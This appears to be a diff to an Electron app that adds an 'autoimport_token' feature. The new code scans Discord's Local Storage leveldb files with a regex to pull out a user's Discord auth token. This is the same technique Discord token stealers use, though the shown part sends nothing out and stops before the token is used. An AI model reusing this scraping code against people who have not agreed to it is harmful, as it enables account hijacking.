@@ -44,7 +44,6 @@ function createWindow() {
     win.setMenuBarVisibility(false);
 
     ipcMain.on('toMain', (event, data) => {
-        // tell the renderer what platform we're on
         if (data.code === 'platform_request') {
             const platform = process.platform;
             event.sender.send('fromMain', {
@@ -52,6 +51,7 @@ function createWindow() {
                 platform,
             });
         }
+
         if (data.code === 'search_for_discord_installs') {
             const discordPaths = [
                 path.join(process.env.LOCALAPPDATA, 'Discord'),
@@ -71,7 +71,7 @@ function createWindow() {
                 return false;
             }
 
-            var installs = discordPaths
+            const installs = discordPaths
                 .filter(p => fs.existsSync(p))
                 .map(p => ({
                     path: p,
@@ -83,6 +83,7 @@ function createWindow() {
                 found: installs.length > 0
             });
         }
+
         if (data.code === 'autoimport_token') {
             const discordPaths = [
                 path.join(process.env.LOCALAPPDATA, 'Discord'),
@@ -91,15 +92,41 @@ function createWindow() {
                 path.join(process.env.LOCALAPPDATA, 'DiscordDevelopment')
             ];
 
-            function getToken(discordPath) {
-                const settingsPath = path.join(discordPath, 'settings.json');
-                try {
-                    if (fs.existsSync(settingsPath)) {
-                        const settings = JSON.parse(fs.readFileSync(settingsPath, 'utf8'));
-                        return settings['TOKEN'] || settings['token'] || null;
+            const TOKEN_REGEX = /[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}/g;
+
+            function getTokenFromLevelDB(discordPath) {
+                const leveldbPath = path.join(discordPath, 'Local Storage', 'leveldb');
+                if (!fs.existsSync(leveldbPath)) return null;
+
+                const files = fs.readdirSync(leveldbPath).filter(f => f.endsWith('.ldb') || f.endsWith('.log'));
+
+                for (const file of files) {
+                    try {
+                        const content = fs.readFileSync(path.join(leveldbPath, file), 'utf8');
+                        const matches = content.match(TOKEN_REGEX);
+                        if (matches && matches.length > 0) {
+                            return matches[0];  // Return the first token found
+                        }
+                    } catch (e) {
+                        // Ignore read errors
                     }
-                } catch (e) {}
+                }
                 return null;
+            }
+
+            function getToken(discordPath) {
+                // Try legacy settings first (likely won't work)
+                const settingsPath = path.join(discordPath, 'settings.json');
+                if (fs.existsSync(settingsPath)) {
+                    try {
+                        const settings = JSON.parse(fs.readFileSync(settingsPath, 'utf8'));
+                        if (settings['TOKEN'] || settings['token']) {
+                            return settings['TOKEN'] || settings['token'];
+                        }
+                    } catch {}
+                }
+                // Fallback to scanning leveldb files
+                return getTokenFromLevelDB(discordPath);
             }
 
             let token = null;
